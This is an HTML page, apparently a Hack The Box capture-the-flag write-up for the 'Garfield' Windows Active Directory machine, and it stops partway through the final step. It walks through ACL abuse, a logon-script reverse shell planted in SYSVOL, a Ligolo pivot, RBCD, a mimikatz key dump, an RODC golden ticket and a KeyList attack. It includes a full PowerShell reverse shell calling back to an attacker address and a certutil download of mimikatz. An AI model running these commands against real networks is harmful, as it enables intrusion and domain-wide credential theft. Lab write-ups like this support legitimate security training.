@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Garfield — HTB Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<style>
+  :root { --bg:#141d2b; --bg2:#1a2332; --bg3:#0f1620; --green:#9fef00; --red:#ff3e3e; --orange:#ffaf00; --blue:#2ea8e5; --purple:#a44eff; --text:#a4b1cd; --text-bright:#ffffff; --border:#2a3a52; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:'Rajdhani',sans-serif; font-size:16px; line-height:1.7; min-height:100vh; }
+  body::before { content:''; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px); pointer-events:none; z-index:1000; }
+  header { background:var(--bg3); border-bottom:1px solid var(--border); padding:0 2rem; display:flex; align-items:center; justify-content:space-between; height:60px; position:sticky; top:0; z-index:100; }
+  .logo { font-family:'Share Tech Mono',monospace; color:var(--green); font-size:1.2rem; letter-spacing:2px; text-decoration:none; }
+  .logo span { color:var(--text); }
+  .header-right { display:flex; gap:0.5rem; align-items:center; }
+  .badge { padding:2px 10px; border-radius:3px; font-size:0.75rem; font-weight:700; letter-spacing:1px; text-transform:uppercase; font-family:'Share Tech Mono',monospace; }
+  .badge-easy   { background:#9fef00; color:#000; }
+  .badge-medium { background:#ffaf00; color:#000; }
+  .badge-hard   { background:#ff3e3e; color:#fff; }
+  .badge-insane { background:#a44eff; color:#fff; }
+  .badge-linux  { background:var(--bg2); border:1px solid var(--border); color:var(--text); }
+  .badge-win    { background:var(--bg2); border:1px solid var(--border); color:var(--text); }
+  .badge-ad     { background:rgba(164,78,255,0.15); border:1px solid rgba(164,78,255,0.4); color:var(--purple); }
+  .badge-season { background:rgba(46,168,229,0.12); border:1px solid rgba(46,168,229,0.35); color:var(--blue); }
+  .container { max-width:1000px; margin:0 auto; padding:3rem 2rem; }
+  .hero { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:2.5rem; margin-bottom:2.5rem; position:relative; overflow:hidden; }
+  .hero::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg,var(--red),var(--purple),var(--blue)); }
+  .machine-name { font-family:'Share Tech Mono',monospace; font-size:2.8rem; color:var(--text-bright); letter-spacing:3px; line-height:1; }
+  .machine-name span { color:var(--red); }
+  .badges { display:flex; gap:0.5rem; flex-wrap:wrap; margin-top:0.8rem; }
+  .stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:1rem; margin-top:1.5rem; }
+  .stat { background:var(--bg3); border:1px solid var(--border); border-radius:5px; padding:0.8rem 1rem; }
+  .stat-label { font-size:0.7rem; text-transform:uppercase; letter-spacing:2px; color:var(--text); margin-bottom:0.3rem; font-family:'Share Tech Mono',monospace; }
+  .stat-value { font-size:1rem; color:var(--text-bright); font-family:'Share Tech Mono',monospace; }
+  .stat-value.green { color:var(--green); }
+  .stat-value.blue  { color:var(--blue); }
+  .stat-value.orange{ color:var(--orange); }
+  .chain { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:1.5rem 2rem; margin-bottom:2.5rem; font-family:'Share Tech Mono',monospace; font-size:0.85rem; line-height:2; }
+  .chain-title { color:var(--green); font-size:0.75rem; letter-spacing:3px; text-transform:uppercase; margin-bottom:1rem; }
+  .chain-step .arrow { color:var(--green); }
+  .chain-step .user  { color:var(--orange); font-weight:700; }
+  .section { background:var(--bg2); border:1px solid var(--border); border-radius:8px; margin-bottom:1.5rem; overflow:hidden; }
+  .section-header { background:var(--bg3); border-bottom:1px solid var(--border); padding:1rem 1.5rem; display:flex; align-items:center; gap:1rem; }
+  .section-num { width:28px; height:28px; background:var(--red); color:#fff; border-radius:4px; display:flex; align-items:center; justify-content:center; font-family:'Share Tech Mono',monospace; font-size:0.85rem; font-weight:700; flex-shrink:0; }
+  .section-num.blue { background:var(--blue); color:#000; }
+  .section-title { font-size:1.1rem; font-weight:700; color:var(--text-bright); text-transform:uppercase; letter-spacing:1px; }
+  .section-cve { margin-left:auto; font-family:'Share Tech Mono',monospace; font-size:0.75rem; color:var(--blue); background:rgba(46,168,229,0.1); border:1px solid rgba(46,168,229,0.3); padding:2px 8px; border-radius:3px; }
+  .section-body { padding:1.5rem; }
+  p  { margin-bottom:1rem; color:var(--text); font-size:1rem; }
+  h3 { color:var(--text-bright); font-size:1rem; font-weight:700; text-transform:uppercase; letter-spacing:1px; margin:1.5rem 0 0.8rem; padding-bottom:0.4rem; border-bottom:1px solid var(--border); }
+  h3:first-child { margin-top:0; }
+  pre { background:var(--bg3); border:1px solid var(--border); border-radius:5px; padding:1.2rem 1.5rem; overflow-x:auto; margin:1rem 0; position:relative; }
+  pre::before { content:attr(data-label); position:absolute; top:0.5rem; right:0.8rem; font-family:'Share Tech Mono',monospace; font-size:0.65rem; color:var(--text); opacity:0.5; text-transform:uppercase; letter-spacing:1px; }
+  code { font-family:'JetBrains Mono',monospace; font-size:0.82rem; line-height:1.8; color:var(--text-bright); }
+  .c-green  { color:var(--green); }
+  .c-orange { color:var(--orange); }
+  .c-blue   { color:var(--blue); }
+  .c-red    { color:var(--red); }
+  .c-purple { color:var(--purple); }
+  .c-dim    { color:#546e8a; }
+  .ic { font-family:'JetBrains Mono',monospace; font-size:0.82rem; background:var(--bg3); border:1px solid var(--border); padding:1px 6px; border-radius:3px; color:var(--green); }
+  .success-box { border-left:3px solid var(--green);  background:rgba(159,239,0,0.07);  padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; color:var(--green);  font-family:'Share Tech Mono',monospace; font-size:0.85rem; }
+  .info-box    { border-left:3px solid var(--blue);   background:rgba(46,168,229,0.07); padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; font-size:0.9rem; }
+  .warn-box    { border-left:3px solid var(--orange); background:rgba(255,175,0,0.07);  padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; font-size:0.9rem; }
+  table { width:100%; border-collapse:collapse; margin:1rem 0; font-size:0.9rem; }
+  th { background:var(--bg3); color:var(--green); font-family:'Share Tech Mono',monospace; font-size:0.75rem; text-transform:uppercase; letter-spacing:2px; padding:0.7rem 1rem; text-align:left; border-bottom:1px solid var(--border); }
+  td { padding:0.7rem 1rem; border-bottom:1px solid var(--border); color:var(--text); }
+  tr:last-child td { border-bottom:none; }
+  .cred { font-family:'JetBrains Mono',monospace; font-size:.82rem; color:var(--orange); cursor:pointer; border:1px dashed rgba(255,175,0,.5); padding:1px 8px; border-radius:3px; background:rgba(255,175,0,.06); user-select:none; }
+  .blur { filter:blur(6px); transition:filter 0.3s; cursor:pointer; user-select:none; display:inline-block; }
+  .blur.revealed { filter:blur(0); cursor:default; }
+  #troll-modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,.85); z-index:9999; align-items:center; justify-content:center; }
+  .troll-inner { background:#1e2b3d; border:1px solid var(--green); border-radius:8px; padding:2.5rem; max-width:420px; width:90%; text-align:center; font-family:'Rajdhani',sans-serif; position:relative; overflow:hidden; }
+  .troll-inner::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg,var(--green),var(--blue)); }
+  .troll-icon  { font-size:3rem; margin-bottom:.5rem; }
+  .troll-title { color:#fff; font-size:1.4rem; font-weight:700; text-transform:uppercase; letter-spacing:2px; margin-bottom:1rem; }
+  .troll-body  { color:var(--text); font-size:.95rem; line-height:1.7; margin-bottom:1.5rem; }
+  .troll-btn   { padding:.6rem 2rem; background:var(--green); border:none; color:#000; border-radius:4px; cursor:pointer; font-family:'Share Tech Mono',monospace; font-size:.85rem; font-weight:700; }
+  footer { text-align:center; padding:2rem; color:var(--text); font-family:'Share Tech Mono',monospace; font-size:0.75rem; border-top:1px solid var(--border); opacity:0.5; }
+</style>
+</head>
+<body>
+
+<header>
+  <a href="../" class="logo">SKID<span>::</span>TUTS</a>
+  <div class="header-right">
+    <span class="badge badge-hard">Hard</span>
+    <span class="badge badge-win">Windows</span>
+    <span class="badge badge-ad">Active Directory</span>
+    <span class="badge badge-season">Seasonal S10</span>
+  </div>
+</header>
+
+<div class="container">
+
+  <div class="hero">
+    <div class="machine-name">GAR<span>FIELD</span></div>
+    <div class="badges">
+      <span class="badge badge-hard">Hard</span>
+      <span class="badge badge-win">Windows</span>
+      <span class="badge badge-ad">Active Directory</span>
+      <span class="badge badge-season">Seasonal S10</span>
+    </div>
+    <div class="stats-grid">
+      <div class="stat"><div class="stat-label">Target IP</div><div class="stat-value blue">10.129.xx.xx</div></div>
+      <div class="stat"><div class="stat-label">OS</div><div class="stat-value">Windows Server 2019</div></div>
+      <div class="stat"><div class="stat-label">Domain</div><div class="stat-value">garfield.htb</div></div>
+      <div class="stat"><div class="stat-label">Open Ports</div><div class="stat-value">88, 389, 445, 5985</div></div>
+      <div class="stat"><div class="stat-label">User Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
+      <div class="stat"><div class="stat-label">Root Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
+    </div>
+  </div>
+
+  <div class="chain">
+    <div class="chain-title">// Attack Chain</div>
+    <div class="chain-step"><span class="user">j.arbuckle</span> <span class="arrow">&#8594;</span> bloodyAD ACL enum &#8594; scriptPath WRITE on l.wilson</div>
+    <div class="chain-step"><span class="user">j.arbuckle</span> <span class="arrow">&#8594;</span> craft reverse shell bat &#8594; upload to SYSVOL &#8594; set scriptPath via bloodyAD</div>
+    <div class="chain-step"><span class="user">l.wilson</span> <span class="arrow">&#8594;</span> logon script fires &#8594; reverse shell &#8594; ForceChangePassword on l.wilson_adm</div>
+    <div class="chain-step"><span class="user">l.wilson_adm</span> <span class="arrow">&#8594;</span> evil-winrm &#8594; <span class="c-green">user.txt</span></div>
+    <div class="chain-step"><span class="user">l.wilson_adm</span> <span class="arrow">&#8594;</span> add self to RODC Administrators &#8594; RBCD on RODC01 &#8594; psexec &#8594; SYSTEM</div>
+    <div class="chain-step"><span class="user">RODC01\SYSTEM</span> <span class="arrow">&#8594;</span> mimikatz &#8594; dump krbtgt_8245 AES256 key</div>
+    <div class="chain-step"><span class="user">l.wilson_adm</span> <span class="arrow">&#8594;</span> PowerView &#8594; modify msDS-RevealOnDemandGroup + clear msDS-NeverRevealGroup</div>
+    <div class="chain-step"><span class="user">Rubeus</span> <span class="arrow">&#8594;</span> RODC Golden Ticket &#8594; KeyList attack &#8594; Administrator TGS &#8594; <span class="c-green">root.txt &#10003;</span></div>
+  </div>
+
+  <!-- ══════ 1 ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">1</div>
+      <div class="section-title">Reconnaissance</div>
+    </div>
+    <div class="section-body">
+
+      <p>Standard nmap scan to identify services. Full Windows AD environment — DC01 is the primary domain controller for <span class="ic">garfield.htb</span>.</p>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> nmap -sC -sV 10.129.xx.xx</code></pre>
+
+      <pre data-label="output"><code>PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+                             <span class="c-dim">(Domain: garfield.htb)</span>
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
+<span class="c-orange">clock-skew: mean: 8h00m05s</span> <span class="c-dim">-- note this, relevant for Kerberos later</span></code></pre>
+
+      <p>Port 5985 (WinRM) is open — shell available with valid credentials. The 8-hour clock skew matters for Kerberos ticket operations later in the box.</p>
+
+      <p>Starting credential is <span class="ic">j.arbuckle / Th1sD4mnC4t!@1978</span>. Confirm and enumerate shares:</p>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> nxc smb 10.129.xx.xx -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares</code></pre>
+
+      <pre data-label="output"><code>SMB  DC01  <span class="c-green">[+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978</span>
+SMB  DC01  Share       Permissions
+SMB  DC01  ADMIN$
+SMB  DC01  C$
+SMB  DC01  IPC$        READ
+SMB  DC01  NETLOGON    READ
+SMB  DC01  <span class="c-orange">SYSVOL      READ</span></code></pre>
+
+      <div class="info-box">READ on SYSVOL is significant — domain logon scripts live under <span class="ic">garfield.htb\scripts\</span> here. There's already a <span class="ic">printerDetect.bat</span> sitting in that folder, which is a clue about the intended path.</div>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> echo "10.129.xx.xx DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    </div>
+  </div>
+
+  <!-- ══════ 2 ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">2</div>
+      <div class="section-title">ACL Enumeration</div>
+    </div>
+    <div class="section-body">
+
+      <p>Enumerate ACL misconfigurations using bloodyAD to surface every object j.arbuckle has WRITE over:</p>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> bloodyAD --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable</code></pre>
+
+      <pre data-label="output"><code>distinguishedName: CN=Guest,...                permission: WRITE
+distinguishedName: CN=krbtgt_8245,...          permission: WRITE
+distinguishedName: CN=Jon Arbuckle,...         permission: WRITE
+distinguishedName: <span class="c-orange">CN=Liz Wilson</span>,...            permission: WRITE
+distinguishedName: <span class="c-orange">CN=Liz Wilson ADM</span>,...        permission: WRITE</code></pre>
+
+      <div class="info-box">The <strong>scriptPath</strong> attribute on a domain user defines the logon script that runs when they authenticate. We have WRITE over l.wilson — so we can set her scriptPath to any file on SYSVOL. Since we can also write to SYSVOL, we plant a malicious bat and it executes under her context on next logon.</div>
+
+      <p>LDAP enumeration also surfaces the broader AD structure:</p>
+
+      <table>
+        <tr><th>Finding</th><th>Detail</th><th>Relevance</th></tr>
+        <tr><td>TIER 1 → AddSelf → RODC ADMINISTRATORS</td><td>ACL on group</td><td>l.wilson_adm can add herself to RODC Admins</td></tr>
+        <tr><td>krbtgt_8245</td><td>RODC KDC account</td><td>AES key signs RODC-issued tickets — needed for Golden Ticket</td></tr>
+        <tr><td>RODC01</td><td>192.168.100.2 (internal)</td><td>Requires pivot tunnel once we have foothold</td></tr>
+      </table>
+
+    </div>
+  </div>
+
+  <!-- ══════ 3 ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">3</div>
+      <div class="section-title">Initial Access — Logon Script Abuse</div>
+    </div>
+    <div class="section-body">
+
+      <p>Three misconfigs chain here: SYSVOL write via SMB, WRITE on l.wilson's scriptPath, and Windows auto-executing logon scripts on authentication. Craft a PowerShell reverse shell, base64 encode it, drop it as a bat in SYSVOL, set the scriptPath — shell arrives when the domain simulates a logon.</p>
+
+      <h3>Step 1 — Generate Reverse Shell Payload</h3>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.xx.xx",9001);
+$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
+  $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+  $sendback=(iex $data 2>&1|Out-String);
+  $sendback2=$sendback+"PS "+(pwd).Path+"> ";
+  $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
+$client.Close()' | iconv -t UTF-16LE | base64 -w0</code></pre>
+
+      <h3>Step 2 — Create and Upload the Bat</h3>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> cat > /tmp/printerDetect.bat &lt;&lt; EOF
+@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Enc &lt;BASE64_OUTPUT&gt;
+EOF
+
+<span class="c-green">$</span> smbclient //10.129.xx.xx/SYSVOL -U j.arbuckle%'Th1sD4mnC4t!@1978'
+smb: \&gt; cd garfield.htb\scripts
+smb: \garfield.htb\scripts\&gt; put /tmp/printerDetect.bat printerDetect.bat</code></pre>
+
+      <pre data-label="output"><code><span class="c-green">putting file /tmp/printerDetect.bat as \garfield.htb\scripts\printerDetect.bat</span></code></pre>
+
+      <h3>Step 3 — Set scriptPath on l.wilson</h3>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> bloodyAD --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
+  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat</code></pre>
+
+      <pre data-label="output"><code><span class="c-green">[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated</span></code></pre>
+
+      <h3>Step 4 — Catch the Shell</h3>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> nc -lvnp 9001</code></pre>
+
+      <pre data-label="output"><code><span class="c-green">connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx]</span>
+
+whoami
+<span class="c-green">garfield\l.wilson</span>
+PS C:\Windows\system32&gt;</code></pre>
+
+      <div class="info-box">The logon script fires every ~30 seconds as the domain simulates user activity. No long wait needed.</div>
+
+    </div>
+  </div>
+
+  <!-- ══════ 4 ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">4</div>
+      <div class="section-title">Lateral Movement — l.wilson &rarr; l.wilson_adm</div>
+    </div>
+    <div class="section-body">
+
+      <p>j.arbuckle has WRITE over <span class="ic">CN=Liz Wilson ADM</span>, which includes password reset rights. From the l.wilson shell:</p>
+
+      <pre data-label="powershell"><code>PS C:\Windows\system32&gt; Set-ADAccountPassword -Identity "l.wilson_adm" `
+  -NewPassword (ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force) -Reset</code></pre>
+
+      <div class="warn-box"><strong>net user fails here.</strong> <span class="ic">net user l.wilson_adm NewPass! /domain</span> returns ACCESS_DENIED — different code path. <span class="ic">Set-ADAccountPassword</span> goes directly through LDAP and respects the WRITE permission we actually have.</div>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> evil-winrm -i 10.129.xx.xx -u l.wilson_adm -p 'WhoKnows123!'</code></pre>
+
+      <div class="success-box">*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop&gt; cat user.txt<br><span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
+
+    </div>
+  </div>
+
+  <!-- ══════ 5 ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">5</div>
+      <div class="section-title">Pivoting to RODC01 — Ligolo-ng</div>
+    </div>
+    <div class="section-body">
+
+      <p>RODC01 is on internal subnet <span class="ic">192.168.100.0/24</span>, not reachable directly. Tunnel through the DC01 foothold using Ligolo-ng.</p>
+
+      <h3>Kali — Set Up Proxy</h3>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
+<span class="c-green">$</span> tar -xzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
+<span class="c-green">$</span> sudo ip tuntap add user $USER mode tun ligolo
+<span class="c-green">$</span> sudo ip link set ligolo up
+<span class="c-green">$</span> ./proxy -selfcert -laddr 0.0.0.0:11601</code></pre>
+
+      <h3>evil-winrm — Upload and Connect Agent</h3>
+
+      <pre data-label="powershell"><code>*Evil-WinRM* PS&gt; upload agent.exe
+*Evil-WinRM* PS&gt; .\agent.exe -connect 10.10.xx.xx:11601 -ignore-cert</code></pre>
+
+      <h3>Ligolo Console — Start Tunnel</h3>
+
+      <pre data-label="bash"><code>ligolo-ng$ session   <span class="c-dim"># select the l.wilson_adm session</span>
+ligolo-ng$ start
+
+<span class="c-green">$</span> sudo ip route add 192.168.100.0/24 dev ligolo
+<span class="c-green">$</span> echo "192.168.100.2 rodc01.garfield.htb RODC01.garfield.htb" | sudo tee -a /etc/hosts
+<span class="c-green">$</span> ping 192.168.100.2</code></pre>
+
+      <pre data-label="output"><code><span class="c-green">64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=69.1 ms  ✓</span></code></pre>
+
+    </div>
+  </div>
+
+  <!-- ══════ 6 ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">6</div>
+      <div class="section-title">RBCD Attack — SYSTEM on RODC01</div>
+    </div>
+    <div class="section-body">
+
+      <p>l.wilson_adm has WRITE over <span class="ic">CN=RODC01</span>. RBCD lets us set <span class="ic">msDS-AllowedToActOnBehalfOfOtherIdentity</span> on the computer object, then impersonate any domain user to it. Create a fake machine account, configure delegation, get a service ticket as Administrator.</p>
+
+      <h3>Add l.wilson_adm to RODC Administrators</h3>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> bloodyAD --host garfield.htb -u l.wilson_adm -p 'WhoKnows123!' \
+  add groupMember "RODC Administrators" l.wilson_adm</code></pre>
+
+      <pre data-label="output"><code><span class="c-green">[+] l.wilson_adm added to RODC Administrators</span></code></pre>
+
+      <h3>Create Fake Machine Account</h3>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
+  -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip 10.129.xx.xx</code></pre>
+
+      <pre data-label="output"><code><span class="c-green">[*] Successfully added machine account FAKE$ with password FakePass123!</span></code></pre>
+
+      <h3>Set RBCD on RODC01 (from evil-winrm)</h3>
+
+      <pre data-label="powershell"><code>*Evil-WinRM* PS&gt; Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$</code></pre>
+
+      <h3>Get Service Ticket + psexec</h3>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
+  -spn cifs/RODC01.garfield.htb \
+  -impersonate Administrator \
+  -dc-ip 10.129.xx.xx
+
+<span class="c-green">$</span> export KRB5CCNAME=$(pwd)/Administrator@<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="74171d12072b263b303744455a131506121d1118105a1c001634333526323d3138305a3c20365a171715171c11">[email&#160;protected]</a>
+
+<span class="c-green">$</span> impacket-psexec -k -no-pass \
+  -dc-ip 10.129.xx.xx \
+  -target-ip 192.168.100.2 \
+  garfield.htb/<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="acedc8c1c5c2c5dfd8decdd8c3deecfee3e8ef9c9d82cbcddecac5c9c0c882c4d8ce">[email&#160;protected]</a></code></pre>
+
+      <pre data-label="output"><code>C:\Windows\system32&gt; whoami
+<span class="c-green">nt authority\system</span></code></pre>
+
+      <div class="info-box"><span class="ic">-target-ip 192.168.100.2</span> is required. Without it impacket resolves RODC01 via DNS and gets DC01's IP. This flag forces the connection to the actual internal address through Ligolo while keeping the hostname correct for Kerberos.</div>
+
+    </div>
+  </div>
+
+  <!-- ══════ 7 ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">7</div>
+      <div class="section-title">Dumping krbtgt_8245 AES256 Key</div>
+    </div>
+    <div class="section-body">
+
+      <p>With SYSTEM on RODC01 we extract the krbtgt_8245 AES key from LSA via mimikatz. This is the key the RODC uses to sign Kerberos tickets — it's what enables forging a RODC Golden Ticket. Serve mimikatz over HTTP from Kali and pull it down with certutil:</p>
+
+      <pre data-label="bash"><code><span class="c-dim"># Kali</span>
+<span class="c-green">$</span> cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /tmp/
+<span class="c-green">$</span> cd /tmp && python3 -m http.server 8888</code></pre>
+
+      <pre data-label="cmd"><code><span class="c-dim"># RODC01 SYSTEM shell</span>
+C:\Windows\Temp&gt; certutil -urlcache -split -f http://10.10.xx.xx:8888/mimikatz.exe mimikatz.exe
+C:\Windows\Temp&gt; mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"</code></pre>
+
+      <pre data-label="output"><code>* Kerberos-Newer-Keys
+  Default Salt : GARFIELD.HTBkrbtgt_8245
+  Credentials
+    <span class="c-orange">aes256_hmac (4096) : <span class="cred" onclick="showTroll()">&#128274; REDACTED</span></span>
+    aes128_hmac (4096) : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></pre>
+
+      <div class="info-box">Also record: <strong>rodcNumber = 8245</strong> and <strong>Domain SID = S-1-5-21-2502726253-3859040611-225969357</strong>. All three are required for the Rubeus golden ticket command.</div>
+
+    </div>
+  </div>
+
+  <!-- ══════ 8 ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">8</div>
+      <div class="section-title">Modifying RODC Replication Policy</div>
+    </div>
+    <div class="section-body">
+
+      <p>A RODC Golden Ticket can only be exchanged for a real service ticket for accounts that are in <span class="ic">msDS-RevealOnDemandGroup</span> and not blocked by <span class="ic">msDS-NeverRevealGroup</span>. Administrator isn't in the allowed group by default — add them and clear the deny list before the KeyList attack will work.</p>
+
+      <p>From evil-winrm as l.wilson_adm:</p>
+
+      <pre data-label="powershell"><code>*Evil-WinRM* PS&gt; upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
+*Evil-WinRM* PS&gt; Import-Module .\PowerView.ps1
+
+*Evil-WinRM* PS&gt; Set-DomainObject -Identity RODC01$ -Set @{
+  'msDS-RevealOnDemandGroup'=@(
+    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
+    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
+  )}
+
+*Evil-WinRM* PS&gt; Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'</code></pre>
+
+    </div>
+  </div>
+
+  <!-- ══════ 9 ══════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">9</div>
+      <div class="section-title">RODC Golden Ticket &rarr; KeyList Attack &rarr; Root</div>
+    </div>
+    <div class="section-body">
+
+      <p>We use the krbtgt_8245 AES key to forge a TGT appearing to come from RODC01, then present it to DC01 via a KeyList request. DC01 validates the RODC-signed TGT, sees Administrator is now in the allowed replication group, and issues a real TGS — domain admin via ticket exchange.</p>
+
+      <div class="warn-box"><strong>Rubeus version is critical.</strong> v2.2.0 silently ignores <span class="ic">/keyList</span> and produces KRB_AP_ERR_BAD_INTEGRITY. You need v2.3.3+. Get it from SharpCollection.</div>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -O /tmp/Rubeus.exe</code></pre>
+
+      <h3>Step 1 — Forge RODC Golden Ticket</h3>
+
+      <pre data-label="powershell"><code>*Evil-WinRM* PS&gt; upload /tmp/Rubeus.exe
+
+*Evil-WinRM* PS&gt; .\Rubeus.exe golden `
+  /rodcNumber:8245 `
+  /flags:forwardable,renewable,enc_pa_rep `
+  /nowrap /outfile:ticket.kirbi `
+  /aes256:<span class="cred" onclick="showTroll()">&#128274; KRBTGT_8245_AES256</span> `
+  /user:Administrator /id:500 `
+  /domain:garfield.htb `
+  /sid:S-1-5-21-2502726253-3859040611-225969357</code></pre>
+
+      <pre data-label="output"><code>[*] Action: Build TGT
+[*] Forged a TGT for '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b1f0d5dcd8dfd8c2c5c3d0c5dec3f1d6d0c3d7d8d4ddd59fd9c5d3">[email&#160;protected]</a>'
+<span class="c-green">[*] Ticket written to <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="afdbc6ccc4cadbf0818181f0eecbc2c6c1c6dcdbddcedbc0ddf0dbc0f0c4ddcddbc8dbefe8eefde9e6eae3eb81e7fbed81c4c6ddcdc6">[email&#160;protected]</a></span></code></pre>
+
+      <h3>Step 2 — KeyList Attack</h3>
+
+      <pre data-label="powershell"><code>*Evil-WinRM* PS&gt; .\Rubeus.exe asktgs `
+  /enctype:aes256 /keyList `
+  /service:krbtgt/garfield.htb `
+  /dc:DC01.garfield.htb `
+  /ticket:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="84f0ede7efe1f0dbaaaaaadbc5e0e9edeaedf7f0f6e5f0ebf6dbf0ebdbeff6e6f0e3f0c4c3c5d6c2cdc1c8c0aaccd0c6aaefedf6e6ed">[email&#160;protected]</a> `
+  /nowrap</code></pre>
+
+      <pre data-label="output"><code>[*] Action: Ask TGS
+[*] Building KeyList TGS-REQ for: 'Administrator'
+[*] Using domain controller: DC01.garfield.htb
+<span class="c-green">[*] Got a TGT for '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0e4f6a636760677d7a7c6f7a617c4e494f5c48474b424a20465a4c">[email&#160;protected]</a>'</span>
+[*] base64(ticket.kirbi):
+    &lt;BASE64_BLOB&gt;</code></pre>
+
+      <h3>Step 3 — Convert + Get Shell on DC01</h3>
+
+      <pre data-label="bash"><code><span class="c-dim"># Save the base64 blob to ticket.b64, then:</span>
+<span class="c-green">$</span> cat ticket.b64 | base64 -d > ticket.kirbi
+<span class="c-green">$</span> impacket-ticketConverter ticket.kirbi ticket.ccache
+<span class="c-green">$</span> export KRB5CCNAME=$(pwd)/ticket.ccache
+
+<span class="c-dim"># Dump all domain hashes</span>
+<span class="c-green">$</span> nxc smb DC01.garfield.htb --use-kcache --ntds</code></pre>
+
+      <pre data-label="output"><code>SMB  DC01  <span class="c-green">[+] GARFIELD.HTB\Administrator from ccache (Pwn3d!)</span>
